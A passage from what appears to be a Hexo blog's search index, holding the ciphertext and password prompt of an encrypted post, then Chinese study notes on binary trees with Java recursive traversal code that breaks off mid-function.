39f65c85762e11bbf06579f9c2bfd76ec28b75f821c72317b4e6415e311b5d858239d04e6a529566dc163f7f95b4fbd1a37ac92be2de9abbf8c0bf5577e7716a33efc1ba7b1d685f7a7e34675c22ebf2ae402564c42342cb0571a24648a88ccac1d5291f56407123885551da90ebfdbcc270ca445a7acf8dc79f1118ad5e9c63035271cd80e152eb16672ce12c4ec55781392dc8be5904845f28924266116826c4b96f8fc7d912fc8b9d90c4868171d56ae5fea09443f15eb91f4ec341c5b123b73c14236fadfcafa8c8a7c70c1cb57dcba648f223cb079c90928b4f05fc43a45c2d1d965a3e30742d3a1cf80e79687afafd5fc5d319f25d0c3cc17f1ba61fb00eaec1fa9c6ac8daea4d4364de1e1ba6f12203ee918dce2177fb46d07bb840ceb33696a41e280ad240ace603c7dabffcf0cc2f9488a8fe3175aced43f967e0136521bd9f9dd5c309aec7da611b5625acb161aeb0ddd6e4879a218d171ae4a72c4eef1621e69efab63f58d3e8e9fe5448daed8e96ae18c57eaf2abe6b563e80bbeeff8362c449ef441fd2a37445a5f94528870b99b230ebbfa9d754ffdd868268e98667082d006e23a246c7e7a27f245f817e842d636522980942b258e3e19c7db4e9f1df4de705822b6f521f106c14739d533a25532adc6a3056bba0ca85724b2d88ca88f4aea33af1c572957762c9958296c3f181af11a48ef2f50bbb2fd2ec009b58cc2ac4e7b61e26bc907048d77063ad19b82afe87d39d12e5af2777c489d6b7aa448ea0f40ed742e1ef106eccafef0651121dc5a1dba64577f00aa4497a4a97d9cc15c943ba1701ce9d484f0e42b6961264f6390f6189e9a99b7962721d4c7b8b8656cea4ae858677c55f5712a72ff3d379290fc18d6f1612fdaff849c8a492512dfcfd24def8ac6e98f16980c13e794a2d4d38093aad2127668bfe6361883968d0ec1b5e098addf3c989c380a05843a5782b0c9a059f7fc821c99c7a819a8e4fbf2beea6b4220c0d25600a7bd06b2303bed1a5a1676d00837f591557fdd81cc94d3798468538a99737415e877557e5511447e004ed3b97843f25963fbe803ff19ab436d5f09da2686547623b52c8b9becfc1509b01e8c9cfbccc81c7cebb86a0e666b380d80e1b9a593ee7552a81d59756a3cbd8ddc01365080cc5f8780e8b98eafd29028ed8f835610010896a96cfb6e8b2582abe2a9778017dc4f86ce49e7bdf74b7538a0c23a832bfe6bc9b0fc288eb1cf263d2f106d76e88e8384d234a39867e58bb0877e5e90647d91ff8b3b7caf4582f617150bb0b01c9ce5080603aac39395a15aea0fdac2fe36468a2a47a669a1a1a5ca3de117dcf5b00e3fe795e1e0d4c255686cdd5fd5beee8ed50500d320171d97ddd4ee0dfb72b4a9a8d6d9dde52fc1139de658fe3d4620cb92a4c251807ff8bdeab93a1d9ecf529a95fa4129acbb5440f6916991fd30db2ea10573cf385bbd4dcd4b647f95e4048379eda9ec382666b95a70b6f74a6ee8e2a63c554157926b1720c77893a1f160416ee31a69053983f64c03285b1a0b39d87eaffb8c43790b5ecb33ec2071345b6dcf1b6780989521d649e97b68808b57b6d0e1f5412b651190e55df26ba4421814e853bd7b38c8ce6d79208b3c6d55146c67cb798704845a388c41462094ed7ee30da6f36deeb77a389ebc8309e8dfdc6010ed793ed55f585a120a3a2a110a96f9de9e7631d4c846a322b80b1dec1ab1d01ead55297b24c07a7291c322e657aebd62b1388cfd1cc68f75aff230e98d3467e2d4843398511fe85fc9747e4244d065b0aeb6a1fc15213fb250cccb46d58de0b5dd9a5faa4c444493a2682bb686f1db7e196f4c6e2e681eba1f175a30cb601f9c2314b28b136778d12d7139b4b7b16600a3af5e018b0508a0b9416bef2c96fa2d20854129ff02150b848f9aa2ce46712bc2e542449245f6f09803cba2fdb588229e619bc2c94c7c8435c681e220d0c845adb6725412c07b08c6934dbcbfcdce2a4ed3396743d7c5c265c6dff920dae1a1f79224984f4418edf5cc4a01d30f1c340fff04ae6d25689a6c2c51a912308e41b74fa7d4a3ac629a5f51eb7310dab870af29f960a699b5b3280d6b200cd815a115893ed5ba6d15685e86dafce702dfeacbb7deb0ec12550961c33b6393d3b08249a1e3b4e9a682d0bd0b6afbc19afe4413b4770a0c87a9f376052997247d0c8ee1604a30a3a35abca3404f2b70f40db58c33e8e3d59bf2b7fe7bd86d56b91939a27cdd6be1c497482f93fdecba64d41b0cebd90f0e8beab085580544efad2cdf6e8690e5a4f76877f12a53c29b9dad069d5802cf9afda3c3c8c4773b2f85fe85fc24c50de6a3d72debab7388f3f276db3a140e6bba9bace4874bb77ebbb76a86630ae828ba5eb50255da4878711429459eb4e41010fe612d60ca65b6ff014b87ec79a52450d1c4c4a8b85a9584cf550cc5134cbbebfd29fb9e9f6ff9ddcd1e39bbd65c354172dcb67dc2f278a854216c3c7dd0e5541f075b49cb329f8053ae50ccbdbb3acb466709da0076767be07ca8a2095102c43cf2d30ae275c94ffd53108412ea7898d94d494a27af36cdc3d9ea0f7e7e57659deb841d1514dc563eca68080ec9437b89447a4a4ad1722048c1288ebc0748c49c41805f72e7c6fb2df75c4749e9997837b0741b33febd4f882ee914f394af89860242591820101d70381b5d12274685eabcba8529a046ea212b623b346e75c857643cb073bbb86cf0bb0a4a50de8c5cb38ab5415c44f705f0ff87612f09080b602be4f000606ce33125a2444e1eb396a4470d3c35c9006c70e81734f52520375142f280658c5ca3bf023a88b52a40dae7de937c8e162dc9cb54cf530b840ce69381987048af112ea82d0bcea5bfbd884475deed5d27f5ea941dc6eb94b22344f7e93d9331af3ddcb80be7c933b8f60280c5203458a71d11c7d609a3ae0ceea0aba35b7e67d34286813d8b4e3e33f54a26f7cf4fd56e881584b09ec46893dc9e0c099bdce1c7d2be9083b9fb4733b153cfbd6ef22a2eba98c09e814cadad3dc41a78a9b689101236706cf3be74f24818e76150c86aa34e480bd97b7ad4b4b7a9e264551074154ad80a090a1cf54d979d6eca905cea615d016fa8728401880d3531197668775c32ccca13c46a8099d7dc9c58be329c66c12a73a3ef954bf7eda974d49554a60a0f5b8d03a4d0183c4d1bda434f20518429cb5ca32117844e4a62ea2cb090057866bc60ce0c69508a9a07bd0f36fb6bc7912732741b4c9b1f8e29c6f136a2518c84ba59aabb5f6ea5f975807c9d23f0b9cc78fbdeaaab36c8920d2065914f9d6bbd4673b87ab74c616309e16fcd4485be5963325319e6960dd7c31913158a85cf6242b03057b88baa886cb995667bcd15bca05f4f923ba9d2f44cb07c3578c2ea0c7d6d03a1c5815806791ad7b009b1040deaf2601cbdf3eace93581a6c3fd4cc733ea9d20c9cd10dbc228a9807d292d2282a22ce6d0cb7926ffad619eba735f7f6c1c103e602ecac1f84ccb4cf303ce11de3fbc758942686daf6df0a7f7e082ef7d789486f357a4d93dd492946addf45fc4ef1d1ac30c90cf232164f1734f018df926ee8e4b4999e05320611405ce962a9dfb25b13188110edecb1413dfd44f9faf20fd94e985486d5331e6f2990469d2ba5d012476ebf60a9e6c5cd5aa5d6864dd8f2891aacb137eb44fd478ada631d3e07f853a5d6577fbcf4a248051e85f7e2831b92fcfdec08e1eece86700277df12449a03a5f06c6ae1a156517c20d0f3688cc053d02da0cd0acbc4a39f33f359a5dc9de3244a35544c6e7103684714a1a6d54f6313573f811678fb0f094d66e006cc594c3a01ceef7295f686c8dde1b6c979804555a3042312ad4136d183eb292e7ea5a6ff5c9f7fcde70594e3c661877c08619f7ba851752886703ed054d7e56c557fbc64a781423507a503289205a6585d5337832d29006db3b910a939e176f822d32de4342435c29683c5ecc79784c91c207f13740200593bc257cd0bafb380c97fc3babeb62bbc7ec809e1fe5d55793a158ad6f64c464774ddefaacb4f91ded62467aef911a9040589e96c6ea4edddf2ee424ae086d15136b513853ad1dfa469f31bb06b3b181842c272cae10da290c8899e60159f162b70cec665ef1ed7250a45dbbc460b366cdca48ba7127506a3d9d56a3081cb4b80b4340dfb0a9dba637e61981937a6cbc72247bce39e172a8da868c31fc01d38bec45fb5cce73c62327c9dac5b7590906ea7d2aa276a2a0eeab6c9587dffdc60a72f4fca280cd5e64ce1eef9159756a342eface958584c35eeab69af0b9938c900e072e2ade9dabed8c9d7a19b36b969dbcf2f475665934b44735ea84db323eaace79fe33619298af69b8505a5309c7cb4eff9e8dcf1a0afaab84f5d183800af5b672ba44e9bd80721ed51a5fc7908581144cc90e89575f7545732935599251d6fc34810e02bddc00935e7755740479507cbe177a6b09a7969068c636f55d2dcd19ec7112f8a0422a4aa50db640482ab1288cc52accefdaff08ae2556d276f9361c3b21d11bd391c104230f78e7b4529e2b40f4db9b8db0b7b8e245bbdfa57cefc109759ec73e1aca2ed5e601ec4b773aa1377aeee989dac001d2a2adae21c2034ba3c397b00a669fd691b39cae6f1b707101c84d67a328281404d0ec58c60acfbb2799dfbb6f1c26e5edadad1b19597fe75a99c3c64e5f373cc87f3df7a961cd1969c8520fe2412c9f25ff401fe4d27e956703c349d3497b9bb8addd5710be8f2db78fb0edf1b0ed7c0eef8d1e4a1067785fd2a3c5a6a7435e652de914d776dc78c3d477e8369bff8cda8f3007ed1815519087b7071fffe64dffb70191c687eb4591d5305eba0f7d05620bc0718ddf3473e0b8d5dd54cb98e7a2da9fac34468b929176089a9f5398f5e4c6d2c90d42a5b9b2af1024104ed3ca72ff462ab7b9680e238f0042f90753680426c86803e8a661f480ee3c6136ec023bfcabaf3c6a2ac1dbc66858e8d836d5e92e40ef49eb01ab9094d55acaeb2e538adfbe519b1c63c1cadc4e5f4f5178f2f419c28412d99f0a582cb3cdde2254c49bc3f3f0a1d70c91fe36cc833115d33136e9b60fb331d9c3cba40dc3511c47102051d2e70f337271718ac1c9cc947f08b3a256e2c71439eda84add04917b763ef838b37556e9d7712e83445a17562237bcc2aa90fd99a1f8576d6a734780a5d732765a4987b4217941867faaefd7f17cf8aaa1cc558a399874a4eaddb9b26f11c310ec6f791c44a5d7cbbc82c4781d134d5f73c99e0754fbd3c5e35f3f6af9ed84a685896932cc894c136cf52fcfa2209af736441cc6e11ca6c29c1f4733f6abfde49cabee5f8cc274dd850d4cea872ca8b053378428235745dbe05152b1e68265bfa5b1024f39bea2312579b2e29deed2fc02cfdc8724c83c7dbf60164186bde6480e9bd2a728ca504460e965ceef4dd5c17d3ce6321e872365c1545f56ede4f6d0c215cbf2e10d4d569448268ca2080c0f6f1797e9ec6c5884a999285c04c4a499b6e8faad81a172a99c52a563e74a0fc651f03bc0a990197e491f68dc4caae755c168c9d0fda0112738b6308ed1791b15ddb3734eb6ea05f0b0248ff2cca6c1cc2ddfaae0487072b34af73b55674e786b3abb185917a929e7aa538b9eb541a83c460ffbd5a61c33f33cf94c993a2c9a1182e62846860cc096ed5e3c42b10e2b46e7634b43a94f6fdbf46a0019e9d925833018fcf45c51020e02860b6bca2c460860a5b1a0e2c2249f261030f77a0fdbed1ca5202af436c6551715fd88bf5579bbf0e68135750f243b74cda6991dc6e6555d602b4bae48c382b2df1ab6025752fcc8714e8e7a57ccafd9079e2bc6b5dd9c67f473cf51adeb95a6b35757b5485ce879985b8fd81257c75d74ddccdca539448673b2ac35e139872c785f6ac4940b155501ea99cac7b12834bb878264419962548bcd3ca2d3899b59353e3d8b2b8f1780e684fbf25be2ba917def283a31f2fd832ff7119763244ddb67e85c9e5e1c06e1ea103b13bad130ef4bb8e17b182333c9d036e5a19662164549e1b035104d23fd58498dc122a2eb96e15aeb7acfa69e64a440a5c1c33ee43f9155af1496681ae94295f6abfafb67aa1dcc9c3d58e10c8500105eeb764e722c09fb014da22d7e75d0d80997a52856250fecc9e6ea54a3232f2001727f3bd6389a4cc74efcfc0327a07e8e9f5fb9a7a3495c18282ddea8d1a7a923793037b72e06437e29027ddd77dbe2a88c2c32d8754132032c8f2fb2e770f50ce1186585d85f10c6eecf8e48978afb55b4740fcc4baf55274d51e07d4458a35fdc7d2758167dcee6c15f83fa022a0289e0c978802bd73ec9b8dc488a84508b8fd413495074de62ae83b34522942c15a5c3cfc8b983bcc55009492a1dcb9f75fccc9cdba7dc10a336f76c60b5c18539bd8b0506974470289e07658f1d9d1061d83260fa485abc0d0043315340cfab12a1be1ed2e2a28830be7677338721d2934c8b93869b1860be45a3b3979de3d06049ce75a1b3dabeec9ebdf58a27417460be5abcb5116bf0e89245240db2d6000c97967238bc01266ec2eab54bf37592ee6897ef153da67c2b64d74aa9d751f70d3802626161edb1f203f65b3a9ee8f732a9f0e81d325cd9939e6657a91820bba90d940416bc06f319b1bbe106ce728d4664f108535588a03bb354ec90ca77bbfd89ce237da3cc1d1047343f04617019853e57c6952d036c4e39e207b88a4822b8e20b76992923470a98db634c1003e237e9db86dd4ac6ba7d1b495a6b2f610a32fca69600f2079c7e1543f34ccfe91b74b334ec7e7a12067923fe7fb747720cb8986017f1deb9e31b1608e67ce6487c74bbbd2f6e42db6d815f92b7ce046cc37d9ca0ff139a23017054ab8a9e1bf0dd738e46113f00ef421542b57716337dae1f3b14d0919f858af8256b3e0a912e18c4b63d55fcfc09c495022781db3f6cbfe8d78003f3154607eca764b248b19d75f8ac623bb55b7d99a2788f463e723f771671a5f2f8f653c8d0626c20bee892d50346ed4287114269a2894422277661141d98e432d1d2aa734122cdff0dc24d898100dbea5bc68e8ce25720dc070c2993e3244ecbe2aebde563f635ac59dde451cc69107fc021c803d0b064147f906c0742b33d3f5d0c80d0f7b258a0bf1774f821af3ee62d13ae573497781770da3cd52fe29f99b9c50a49d87593c48ddeb2b5cc9719aa6f28856673c53019311f4824fa4d03cefd706b48308477c6415d8567245b973aeedbb80456f2cdcc8d1a6f12cd290b757c866f5241905a7a907ea1189d4dc8a9cc847aafffd5454e20633c36d2c7cc28b6b4eea432ec3de99a1246f0f46ef16a0e485a78a3936deb7c82e014a735850e353f3049a0505421bb633ad721ee748c8d29dbeafd95e6b979b1ded1ea97d3d4685afa95b4df3a1715c8ecb4fa7f55922ac1ae26f007c0bb3ff4af7f986a864aeddbbcc8ce342cdb9175b90c53ea5a0d791d75773fea0eb2f4e611ae370931a51da12fa7478905ae3f76b4ebd72bca974170fd9b528e77a224c77fd0066955c25a5465bc7712f0ae3cd808f45fd9c3722513995403f81c3399f749ad17bcce557c72767a9242bf9cc9f047ca00ce53bb9c4a324b77c15247b77d3f7e2a53ba32388301008108aba0ef0f14a9a49b59e647b2e3b6cc08afa9b8c35f197153f96080fa412c8b1730f53f36539b69629a538b9655a334451b7d6cff15c75365bb8fe455c36c6806da7ae3666d014e164c3693cef23112d52178295c7b33377916a38ff3d07d7f08f663d6bcb67d93cea9eb335a51bea28a1c35042b92cd93d5d25c600ee704c7608ff0d8bd230640c038bd35c5ee2ccad10e9e3efde72a61621c928ce33584860bf7674b9eac1114220b77ed0167a9fc133b864105505d4de71429fb3f86f4f27be90db3773f679fabb090578e64a6a44f7f791ceeb4d6cdcec8e0208a7e075c0ce875f7e359806fba5bd5f74ca21facd4648f2bf9bcabb92851faec10756c5819bac63266526e0335d785a62a68e293c7bef5970c7b4733ea82ca1c875be21d3ad868f48addd1f50d3b0d4df884624eec282300b63d3fa4222b7eee612e741b6724f9aafa606db43417cbd2a43977556586c2c52f0621085cb5d23af90dd41fbd52268c07954618d9a1ec1443fb83ca545bb20a4d7e7aa6ba9dc0f6be8f4fcf587a3ca14ceccf32daef70f39894cd83ebf7fe769876b7cd09aedfc634cb5c1edcc0c13107f1a02a42e8d36d39b31d89828323d9f974f186741a3b46363e697fa1869e3b1d1b3414bf035171b1ec936113eb65a24bf4fd0bf526693eca4404d5f0362ffbe16f87d4b2c6420a992c3764d62b2fa4d242d38c8a6a540cf4021efb6e5b118c0553621a64e315338682ab63c1ce3aa5aba26df879e80f4117abc41ab23c4535e16762368aba6d49148d3eb1acf54e66487c800282c38b09ed8b4451c0bfea8b2167b647843a157c2f806793eeaacde3442fb6c899d288132ad8c6481cc72329d7c9929ff6ed084b9414955260dc198a9c188b5b78d906dd9445826453a462b7600b7590d50f5255e9fb4e404d1569765bc43911c491db24bdf348c5b7b61800a1ef7a7d153802240b7800feec4b4d7c0ecc7837d95b0a050e8e5c942d3d6ea68f12e94c96e208dcb6609b353a3ee6f812c41216ef1c6ff598fc1787bf9d056b49f03f3210ca7738a1a4b0c234b6cc576a4b25e8284754ea0b6e5eb0ccd4e3958205865f23a3330157d256dd24294f921ac17dfb6c2ac716e40dfc978efdc7f570bbd98432e3e233bae8310d43466ea561753ef1a22605c107b5bba87e8b60d27399a69bcd04df14a6039225a5fbfc14da2a23e604638bbd378d978f50e86550a0399df8662fb8e45ba81cdfd9af16ddfdc26eb3a4e95c01d91b8d9cf77b6d9f3abc5a72b031646c8e94dd0dcfef86fbc3e357cc9cc8319f43fad2e0bf20cc0808e4e6430b6ef308fbbe1c62adb3d97507fabf65bf21a813fcd95526e890e82844b70870de1c8d36a310ca85af6c677d2e4f620d9381f984c7bf480a3d93fb0d5011a9d74666a70416e39f9a0382cfb004e4af3b2d8f96ac9402d1475e5f4d2f76b06c5cb6ac8dd13ea59594a3bd9dac98f9c9f5b7ca261531f2a4691f9230e3f24b6d61276a2f4cf33a477d65d17ab6badf667f6e6cadc8017ec7e8e1bda2fdc7ca2fd0dc616df90e539fa0910a5304a09f83f9fb8cacdba5706eff690b193207df5af00b21feb6d30282c1b1aea3abff5758709df0d538173b293e3c6b0ff076a549ed76aac9d825e80e45ab1394ad0628aef27a07c84dcf2c3bff3bb9ca4594beb3e60a9a6c79137cdc3212b0f503b37b48e9c157e8e58560b07393002aac992a379901b43a7c6d69e3ef2fa3d0f27b2659afe7e8c7ea1c04a12f49e5f0c2cc1bc99019b403fd9a5b8c5edeb86ecb49a8d3fd89ebbc3eb3637fa88b903e8b8cc7b4370ed7a210a2dc4b72f2a0bffd4f96a9e1bfaa1e2e1997ad166bd7e6110351f04b05aaca50aca256f5e1fe227669df45cd791073e35fe298dcc1f3aef064216184345c8311522cef1d0a533f87f7db049606e59d9ed617789a74620fd703161183f642f47638cc79fb1bec0501865311ec27203d67710a9f21ba65b2f65b270db281b83d0ef24bbaa1a7ded15e18bbf5e22fe2c525b981bb5d453a5686deb60fe41eb270fc12e859828332a04a677b1892ff23e0290cfb8690556fcbcf2f8480aa78802534eccfb0038e1ed99504850c0f002e101cd740d915f0b7dd7443f114301f9cb471970d850d43aa2c9c5da78be88f303f8e6d1ad36bfb56a0bce2b25115c936a1984bda61a69bc3a07b6ac177a64fa619476632dfb0456b2ed585780d53af010df1f283bc519bc5743249281209d37b212afb518c496b4d00c60498b6f55ef04d422b6ddc4f1cd1385c6b8eac4e18cce2b14d93ec79f2b1be89e95e2da776f7f711cf2f85db1c1d56f9dffbc0b2af9d278d943e3c568d4c569d4ce15c8f55b1d205efe5321c73bb9fb1f7d57da2f667712126de6da99f1128c587c630dd92b8076973419bff47e4deded67c74b77525f92fdf3d5118a49a4e2caf41cddeaf96f2fae237776a784e501b048234fa5e1858e67a97e55b781a96394460d17824a9e0ca0cbd607da5b22ddc34a9ae7040e9e51a587162993c464d004a8fb353a059f118b35c4992477c481009b7ae5134e052a801bc4fc49002d1d1058a3819f6571f8a0798237d1bcf317571a3f1418cbc681718e8ab117ce078bbe778d2aefc8cf8ed6629b14ce2a6faada0fb4003205ea6b5c01de00494d7e7890f78d0bb8c050ff0a08f4297848c384ed150ffa2cc708e23bea8b5ce38619cdf89ec690df05072862835256c09c40f63792fb242ab9d849375f7d43a3c663fe3ae29a059f70e341843c10bab3c04cd58daedacfc7ddb4b64fcb4b06a17e047621f7d3579f881c9e979fe8faf2106ff8ddfdca4d53dcd7df3cc2a158ca5c9396c147c38162d73892c683230f204b2a2ba474449031dba6735ab22496ec6fac32dc212aa3071487814290b18a62029dd9ba4626b716187c6800fc10f32897bd20a4c67b359dc75d74069171e34fb282e436a676055792a299ed9e9c2f40508c2dc0c850806ec20519ae0482add6db6a328d7ae766b47135ccc4f6824c3d845514bebc646b09e9ee7c4c7713a4c05d82efb14bb1c952fbb2d77c935844b5a2e80fcfdc57aba38db5f000843788f83fae81b18b659db7a006792244215792a7a0d0084fe46d9cefb3222528c3a5ae286538da9ed6e450b982730ca84e35ab3c7575a4d0635d39f28c5726a51ecc68e684081e27e9ce0cc750da13610026326a547d636641d64da552da80a67edfe1ca5d2b1d9b4e64d9b53e26926a2434213396431263c1ec8f3ac453de8b47d8d74ccbe8a47786ae36ce74171eb86b66f2e95064564871cff86b0ea73ceac3d92c6837e4f8ebbab89fb1545817417c0ec6ebee7cc20c73b60386bb7795c6317e2a2ceb39bcbefca585ffb4ff961cd597c89d095898d20227ead589eb794444f141ae2abc03b7047518aac108e52931de8e725586d375fcc0d0e20d4ce777e5414e0d2ec19b3dd7c0410590f44d261e05f63f0eb5efb5dbaa0774a0269c8f7434254489da8f6b159c4687b2bb1afbefdc4bc07135ac94e7689dfeca5821a81f075cbf98db089006e2d796ad56a313b8549bc8439bf93107fad80222e21712b5a22fb5f9618ea5fff3abc3700c961bde19bbf6cd4024d0dcfcfce02cbd6eecc68b60735d317944a52908ee61b489765f3eb0692e41398638b2e340b2e9569a5ba3b6299a8b54cead2547a0acf6afb0d090ac568d587218a293f2f6837b2d1e423de040278edc965c4d64826aca87800e5ac8c539b0dbe5f21784cb5ae1c0ba4ab67554eab9a01281c6d6c86b5c3ed118b285791bdf42aa19c603af44cd111e451ce1a4cb1c46691f74a8ecb376f4743aa3255f5a37e01fd3309d6c1524d73fe37fb9c614eca34bb4bb8b3fe645f9fcc229ab373ad89caba155e4c0ebd25e55d7c4eb29d130719e29fbffa88a5d41458b15cc6ac63916d8e595d23b0629e724b9565da3e5f49f9c4b2949510cb3dc0b53c83de64664d7be6e9d6957b2b98e25f90b8a1a92f0db467add99ada9241aff77b5a931ac6c3367b66e4fe6dd402b7227a09952e30f093a0baf833a61d60f3f089fb9393dce760fabd7e7714965dcd8d30f0f9d75ff62ba7dc24f929a02439ccab5566e487c42c95fd4903624a6b3016b98aadb435d08885743ba24f1cd82084b8eabada4f5178b44ad42f5e28e068888ce770d190a28df1eeb633071208751aeeb73c299556d0dd80fe887bfc31058955adfe443caceb3201febf161d1cc125a4d6ec7b06ee48ce73c798556cda119a9b4677e66eb8d7ba9089706f0c5865e9880931e51ff041486f7012e3cc23a0d1edd6ab57b7cb4cb1a1cd45143521a07a17ac80f45c0680939f320e8d8dddc322ee198c9e51fe7a5a3f5dbbe16294819b8d8ee0059a6b1fe61098fea9b660ac76d8cf17a90969bfd5938f8669b4f6456adda9c456c8c7437d05046c7f896ea8373239dcaf3affe817d5742a701e1cf910af084ba410d7f354921f3610130d17beb59ae8a2a0b8ccc2a11079b934bb4107951cde6cabd19f94388b6e7a1360955c297f55ca975cdf8cbccc616ff39a3d190a47475a91efa2f241d65dfeca76f90286107857319f6896ea0c791b9566956b0fa11fef1dd32d7cc8fae3d9edf34d15895ea0eba160300f89c419e689fc53d12e6211fcdc6148b7865ef20c83</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码查看~</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Work</category>
      </categories>
      <tags>
        <tag>Network</tag>
      </tags>
  </entry>
  <entry>
    <title>算法-二叉树</title>
    <url>/2024/08/30/%E7%AE%97%E6%B3%95-%E4%BA%8C%E5%8F%89%E6%A0%91/</url>
    <content><![CDATA[<p><a href="https://www.programmercarl.com/%E4%BA%8C%E5%8F%89%E6%A0%91%E7%90%86%E8%AE%BA%E5%9F%BA%E7%A1%80.html#%E9%A2%98%E7%9B%AE%E5%88%86%E7%B1%BB">学习-代码随想录</a></p>
<h2 id="常用算法"><a href="#常用算法" class="headerlink" title="常用算法"></a>常用算法</h2><p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20210219190809451.png" alt="二叉树算法和对应题型"></p>
<p>二叉树主要考察<code>满二叉树</code>和<code>完全二叉树</code>。</p>
<h3 id="满二叉树及其性质"><a href="#满二叉树及其性质" class="headerlink" title="满二叉树及其性质"></a>满二叉树及其性质</h3><p>如果一颗二叉树只有度为0的结点和度为2的结点，并且度为0的结点在同一层，则这棵二叉树称为<code>满二叉树</code></p>
<ol>
<li>深度为k的满二叉树，有2^k-1个节点</li>
</ol>
<h3 id="完全二叉树及其性质"><a href="#完全二叉树及其性质" class="headerlink" title="完全二叉树及其性质"></a>完全二叉树及其性质</h3><p>在完全二叉树中，除了最底层节点可能没填满外，其余每层节点数都达到最大值，并且最下面一层的节点都集中在该层最左边的若干位置。</p>
<ol>
<li>若最底层为第 h 层（h从1开始），则该层包含 1~ 2^(h-1) 个节点。</li>
</ol>
<h3 id="二叉搜索树和平衡二叉搜索树"><a href="#二叉搜索树和平衡二叉搜索树" class="headerlink" title="二叉搜索树和平衡二叉搜索树"></a>二叉搜索树和平衡二叉搜索树</h3><p>二叉搜索树是一个有序树。</p>
<ol>
<li>若它的左子树不空，则左子树上所有结点的值均小于它的根结点的值；</li>
<li>若它的右子树不空，则右子树上所有结点的值均大于它的根结点的值；</li>
<li>它的左、右子树也分别为二叉排序树</li>
</ol>
<p>平衡二叉搜索树：又被称为AVL（Adelson-Velsky and Landis）树，且具有以下性质：</p>
<ol>
<li>它是一棵空树或它的左右两个子树的高度差的绝对值不超过1，并且左右两个子树都是一棵平衡二叉树</li>
</ol>
<p>Java中TreeMap和TreeSet底层就是通过平衡二叉搜索树（红黑树）实现的</p>
<h3 id="二叉树的存储"><a href="#二叉树的存储" class="headerlink" title="二叉树的存储"></a>二叉树的存储</h3><p>链式存储：指针，左右指针</p>
<p>顺序存储：数组</p>
<ol>
<li>若其父结点为<code>i</code>，则<ol>
<li>左子节点为<code>i * 2 + 1</code>;</li>
<li>右子节点为<code>i * 2 + 2</code>;</li>
</ol>
</li>
</ol>
<h3 id="二叉树的遍历"><a href="#二叉树的遍历" class="headerlink" title="二叉树的遍历"></a>二叉树的遍历</h3><p>广度优先搜索：一层一层的去遍历（迭代法），一般使用队列实现。</p>
<p>深度优先遍历：先往深走，遇到叶子节点再往回走（迭代法，递归法）可以借助栈使用递归来实现。这里的遍历顺序<code>指的是父节点的位置</code>，前序遍历即父节点先被遍历。<code>左节点一定先于右节点被遍历</code></p>
<ol>
<li>前序遍历</li>
<li>中序遍历</li>
<li>后序遍历:</li>
</ol>
<h2 id="重要例题"><a href="#重要例题" class="headerlink" title="重要例题"></a>重要例题</h2><h3 id="三序深度遍历"><a href="#三序深度遍历" class="headerlink" title="(三序深度遍历)"></a>(三序深度遍历)</h3><h4 id="递归法-144-前序-145-后序-94-中序"><a href="#递归法-144-前序-145-后序-94-中序" class="headerlink" title="(递归法) 144 前序 145 后序 94 中序"></a>(递归法) 144 前序 145 后序 94 中序</h4><p><code>递归三要素</code>，保证写出正确的递归算法：</p>
<ol>
<li><code>确定递归函数的参数和返回值</code>： 确定哪些参数是递归的过程中需要处理的，那么就在递归函数里加上这个参数， 并且还要明确每次递归的返回值是什么进而确定递归函数的返回类型。</li>
<li><code>确定终止条件</code>： 写完了递归算法, 运行的时候，经常会遇到栈溢出的错误，就是没写终止条件或者终止条件写的不对，操作系统也是用一个栈的结构来保存每一层递归的信息，如果递归没有终止，操作系统的内存栈必然就会溢出。</li>
<li><code>确定单层递归的逻辑</code>： 确定每一层递归需要处理的信息。在这里也就会重复调用自己来实现递归的过程。</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 前序遍历</span></span><br><span class="line"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">preorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">    List&lt;Integer&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;();</span><br><span class="line">    preorder(root, result);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">preorder</span><span class="params">(TreeNode root, List&lt;Integer&gt; result)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    result.add(root.val); <span class="comment">// 当前结点首先输出</span></span><br><span class="line">    preorder(root.left, result);</span><br><span class="line">    preorder(root.right, result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 后序</span></span><br><span class="line"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">postorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">    List&lt;Integer&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;();</span><br><span class="line">    postorder(root, result);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">postorder</span><span class="params">(TreeNode root, List&lt;Integer&gt; result)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    postorder(root.left, result);</span><br><span class="line">    postorder(root.right, result);</span><br><span class="line">    result.add(root.val); <span class="comment">// 当前结点最后输出</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 中序</span></span><br><span class="line"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">inorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">    List&lt;Integer&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;();</span><br><span class="line">    inorder(root, result);</span><br><span class="line">    <span class="keyword">return</span> 